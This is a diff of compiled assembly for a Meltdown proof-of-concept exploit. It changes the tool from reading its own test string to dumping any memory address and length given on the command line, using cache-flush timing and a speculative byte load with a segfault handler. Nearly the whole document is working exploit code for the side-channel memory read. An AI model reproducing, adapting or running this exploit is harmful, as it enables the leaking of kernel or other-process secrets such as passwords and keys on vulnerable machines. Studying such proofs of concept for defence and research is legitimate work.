@@ -1,4 +1,4 @@
-	.file	"meltdownFrichetten.c"
+	.file	"meltdownNew.c"
 	.text
 	.type	sigaction_segv, @function
 sigaction_segv:
@@ -75,7 +75,7 @@ probe_one:
 	movq	%rax, -2352(%rbp)
 	movq	-2352(%rbp), %rax
 #APP
-# 106 "meltdownFrichetten.c" 1
+# 104 "meltdownNew.c" 1
 	mfence
 	clflush	0(%rax)
 # 0 "" 2
@@ -92,7 +92,7 @@ probe_one:
 	movq	-2408(%rbp), %rdx
 	movq	-2416(%rbp), %rcx
 #APP
-# 158 "meltdownFrichetten.c" 1
+# 156 "meltdownNew.c" 1
 	.global __speculative_byte_load_exit 
 	92:                              
 	xorq	%rax, %rax
@@ -32625,7 +32625,7 @@ __speculative_byte_load_exit:
 	movq	-2344(%rbp), %rax
 	movq	%rax, %rcx
 #APP
-# 120 "meltdownFrichetten.c" 1
+# 118 "meltdownNew.c" 1
 	mfence
 	lfence
 	rdtsc
@@ -32867,13 +32867,14 @@ dump_hex:
 .LFE13:
 	.size	dump_hex, .-dump_hex
 	.section	.rodata
+	.align 8
 .LC4:
+	.string	"usage: %s [start_addr (hex)] [len (dec)] [raw, optional]\n"
+.LC5:
 	.string	"mmap() failed: %s\n"
 	.align 8
-.LC5:
-	.string	"poke buffer: %p, page size: %i\n"
 .LC6:
-	.string	"Start address: 0x%016lx \n"
+	.string	"poke buffer: %p, page size: %i\n"
 	.text
 	.globl	main
 	.type	main, @function
@@ -32895,8 +32896,8 @@ main:
 	movq	%rax, -24(%rbp)
 	xorl	%eax, %eax
 	call	getpagesize@PLT
-	movl	%eax, -248(%rbp)
-	movl	$0, -244(%rbp)
+	movl	%eax, -244(%rbp)
+	movl	$0, -248(%rbp)
 	movq	$0, -232(%rbp)
 	movq	$0, -224(%rbp)
 	leaq	-208(%rbp), %rax
@@ -32916,13 +32917,42 @@ main:
 	movq	%rax, %rsi
 	movl	$11, %edi
 	call	sigaction@PLT
-	movq	test.0(%rip), %rax
-	movq	%rax, -232(%rbp)
-	movq	test.0(%rip), %rax
+	cmpl	$2, -260(%rbp)
+	jle	.L33
+	cmpl	$4, -260(%rbp)
+	jle	.L34
+.L33:
+	movq	-272(%rbp), %rax
+	movq	(%rax), %rax
+	movq	%rax, %rsi
+	leaq	.LC4(%rip), %rax
 	movq	%rax, %rdi
-	call	strlen@PLT
+	movl	$0, %eax
+	call	printf@PLT
+	movl	$0, %eax
+	jmp	.L47
+.L34:
+	movq	-272(%rbp), %rax
+	addq	$8, %rax
+	movq	(%rax), %rax
+	movl	$16, %edx
+	movl	$0, %esi
+	movq	%rax, %rdi
+	call	strtoul@PLT
+	movq	%rax, -232(%rbp)
+	movq	-272(%rbp), %rax
+	addq	$16, %rax
+	movq	(%rax), %rax
+	movl	$10, %edx
+	movl	$0, %esi
+	movq	%rax, %rdi
+	call	strtoul@PLT
 	movq	%rax, -224(%rbp)
-	movl	-248(%rbp), %eax
+	cmpl	$4, -260(%rbp)
+	jne	.L36
+	movl	$1, -248(%rbp)
+.L36:
+	movl	-244(%rbp), %eax
 	sall	$8, %eax
 	cltq
 	movl	$0, %r9d
@@ -32934,43 +32964,37 @@ main:
 	call	mmap@PLT
 	movq	%rax, -216(%rbp)
 	cmpq	$-1, -216(%rbp)
-	jne	.L33
+	jne	.L37
 	call	__errno_location@PLT
 	movl	(%rax), %eax
 	movl	%eax, %edi
 	call	strerror@PLT
 	movq	%rax, %rsi
-	leaq	.LC4(%rip), %rax
-	movq	%rax, %rdi
-	movl	$0, %eax
-	call	printf@PLT
-	movl	$-1, %eax
-	jmp	.L34
-.L33:
-	movl	-248(%rbp), %edx
-	movq	-216(%rbp), %rax
-	movq	%rax, %rsi
 	leaq	.LC5(%rip), %rax
 	movq	%rax, %rdi
 	movl	$0, %eax
 	call	printf@PLT
-	movq	-232(%rbp), %rax
+	movl	$-1, %eax
+	jmp	.L47
+.L37:
+	movl	-244(%rbp), %edx
+	movq	-216(%rbp), %rax
 	movq	%rax, %rsi
 	leaq	.LC6(%rip), %rax
 	movq	%rax, %rdi
 	movl	$0, %eax
 	call	printf@PLT
 	movq	$0, -240(%rbp)
-	jmp	.L35
-.L38:
-	cmpl	$0, -244(%rbp)
-	jne	.L36
+	jmp	.L38
+.L41:
+	cmpl	$0, -248(%rbp)
+	jne	.L39
 	cmpq	$0, -240(%rbp)
-	je	.L36
+	je	.L39
 	movq	-240(%rbp), %rax
 	andl	$15, %eax
 	testq	%rax, %rax
-	jne	.L36
+	jne	.L39
 	movq	-232(%rbp), %rdx
 	movq	-240(%rbp), %rax
 	addq	%rdx, %rax
@@ -32981,21 +33005,21 @@ main:
 	movq	%rax, %rsi
 	movq	%rcx, %rdi
 	call	dump_hex
-.L36:
+.L39:
 	movq	-232(%rbp), %rdx
 	movq	-240(%rbp), %rax
 	leaq	(%rdx,%rax), %rcx
 	movq	-240(%rbp), %rax
 	andl	$15, %eax
 	movq	%rax, %rbx
-	movl	-248(%rbp), %edx
+	movl	-244(%rbp), %edx
 	movq	-216(%rbp), %rax
 	movq	%rax, %rsi
 	movq	%rcx, %rdi
 	call	probe_one
 	movb	%al, -48(%rbp,%rbx)
-	cmpl	$0, -244(%rbp)
-	je	.L37
+	cmpl	$0, -248(%rbp)
+	je	.L40
 	movq	-240(%rbp), %rax
 	andl	$15, %eax
 	movq	%rax, %rdx
@@ -33005,39 +33029,39 @@ main:
 	movq	%rax, %rsi
 	movl	$1, %edi
 	call	write@PLT
-.L37:
+.L40:
 	addq	$1, -240(%rbp)
-.L35:
+.L38:
 	movq	-240(%rbp), %rax
 	cmpq	-224(%rbp), %rax
-	jb	.L38
-	cmpl	$0, -244(%rbp)
-	jne	.L39
+	jb	.L41
+	cmpl	$0, -248(%rbp)
+	jne	.L42
 	cmpq	$0, -240(%rbp)
-	je	.L39
+	je	.L42
 	movq	-240(%rbp), %rax
 	andl	$15, %eax
 	testq	%rax, %rax
-	je	.L40
+	je	.L43
 	movq	-240(%rbp), %rax
 	andl	$15, %eax
 	movq	%rax, %rdx
-	jmp	.L41
-.L40:
+	jmp	.L44
+.L43:
 	movl	$16, %edx
-.L41:
+.L44:
 	movq	-240(%rbp), %rax
 	andl	$15, %eax
 	testq	%rax, %rax
-	jne	.L42
+	jne	.L45
 	movq	-240(%rbp), %rax
 	subq	$1, %rax
 	andq	$-16, %rax
-	jmp	.L43
-.L42:
+	jmp	.L46
+.L45:
 	movq	-240(%rbp), %rax
 	andq	$-16, %rax
-.L43:
+.L46:
 	movq	-232(%rbp), %rcx
 	addq	%rcx, %rax
 	movq	%rax, %rcx
@@ -33045,8 +33069,8 @@ main:
 	movq	%rax, %rsi
 	movq	%rcx, %rdi
 	call	dump_hex
-.L39:
-	movl	-248(%rbp), %eax
+.L42:
+	movl	-244(%rbp), %eax
 	sall	$8, %eax
 	movslq	%eax, %rdx
 	movq	-216(%rbp), %rax
@@ -33054,12 +33078,12 @@ main:
 	movq	%rax, %rdi
 	call	munmap@PLT
 	movl	$0, %eax
-.L34:
+.L47:
 	movq	-24(%rbp), %rdx
 	subq	%fs:40, %rdx
-	je	.L44
+	je	.L48
 	call	__stack_chk_fail@PLT
-.L44:
+.L48:
 	movq	-8(%rbp), %rbx
 	leave
 	.cfi_def_cfa 7, 8
@@ -33067,15 +33091,6 @@ main:
 	.cfi_endproc
 .LFE14:
 	.size	main, .-main
-	.section	.rodata
-.LC7:
-	.string	"Hmm, this does really work!"
-	.section	.data.rel.local,"aw"
-	.align 8
-	.type	test.0, @object
-	.size	test.0, 8
-test.0:
-	.quad	.LC7
 	.ident	"GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0"
 	.section	.note.GNU-stack,"",@progbits
 	.section	.note.gnu.property,"a"
